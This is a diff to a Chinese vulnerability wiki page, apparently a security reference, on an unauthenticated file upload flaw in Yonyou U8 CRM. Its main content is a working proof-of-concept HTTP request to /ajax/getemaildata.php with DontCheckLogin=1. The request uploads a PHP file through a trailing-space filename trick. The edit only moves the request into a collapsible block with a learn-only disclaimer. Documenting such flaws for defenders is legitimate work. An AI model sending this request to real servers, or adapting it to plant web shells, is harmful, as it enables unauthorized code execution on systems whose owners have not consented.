@@ -33,8 +33,10 @@ web.body="用友U8CRM"
 
 验证POC
 
-```
-POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
 Host:
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ
 
@@ -42,10 +44,11 @@ Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwIn
 Content-Disposition: form-data; name="file"; filename="test.php "
 Content-Type: text/plain
 
-<?php phpinfo();?>
+&lt;?php phpinfo();?&gt;
 
-------WebKitFormBoundarykS5RKgl8t3nwInMQ
-```
+------WebKitFormBoundarykS5RKgl8t3nwInMQ</code></pre>
+
+</details>
 
 ![image-20230828151040826](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828151040826.png)
 
